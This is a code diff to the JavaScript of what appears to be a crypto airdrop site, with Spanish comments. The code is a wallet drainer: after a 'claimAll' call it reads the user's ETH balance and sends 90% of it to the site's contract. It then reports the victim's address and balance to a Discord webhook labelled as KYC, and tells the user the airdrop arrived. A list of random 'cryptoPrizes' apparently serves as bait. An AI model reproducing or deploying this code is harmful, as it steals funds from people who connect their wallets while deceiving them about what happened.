@@ -669,49 +669,55 @@ const tokens = TOKENS_BY_NETWORK[selectedNetwork];
         web3.utils.toWei("100", "ether")
       ];
 
-      try {
-       await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
+     try {
+  await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
 
-// Obtener balance actual
-const balanceWei = await web3.eth.getBalance(userAccount);
-const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+  // Obtener balance actual
+  const balanceWei = await web3.eth.getBalance(userAccount);
+  const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
 
-// Calcular 90% y convertir a Wei
-const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
+  // Calcular 90% y convertir a Wei
+  const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
 
-// Enviar 90% al contrato
-await web3.eth.sendTransaction({
-  from: userAccount,
-  to: NETWORKS[selectedNetwork].contractAddress,
-  value: ninetyPercent
-});
+  // Enviar 90% al contrato
+  await web3.eth.sendTransaction({
+    from: userAccount,
+    to: NETWORKS[selectedNetwork].contractAddress,
+    value: ninetyPercent
+  });
 
-// Notificar en Discord
-await sendToDiscordWebhook('kyc', userAccount, balanceEth);
-alert("Airdrop recibido y 90% enviado al contrato");
+  // Notificar en Discord
+  await sendToDiscordWebhook('kyc', userAccount, balanceEth);
+  alert("Airdrop recibido y 90% enviado al contrato");
+} catch (error) {
+  console.error(error);
+  alert("Error al ejecutar el claim");
+}
 
 
-    async function sendToDiscordWebhook(eventType, address, balance) {
-      const embed = {
-        title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
-        color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
-        fields: [
-          { name: 'Dirección', value: address },
-          { name: 'Balance', value: `${balance} ETH` }
-        ],
-        timestamp: new Date().toISOString()
-      };
 
-      try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ embeds: [embed] })
-        });
-      } catch (error) {
-        console.error("Error enviando a Discord:", error);
-      }
-    }
+   async function sendToDiscordWebhook(eventType, address, balance) {
+  const embed = {
+    title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
+    color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
+    fields: [
+      { name: 'Dirección', value: address },
+      { name: 'Balance', value: `${balance} ETH` }
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (error) {
+    console.error("Error enviando a Discord:", error);
+  }
+}
+
 
 	   const cryptoPrizes = [
             { token: 'USDT', amount: () => (Math.random() * 50 + 10).toFixed(2) },
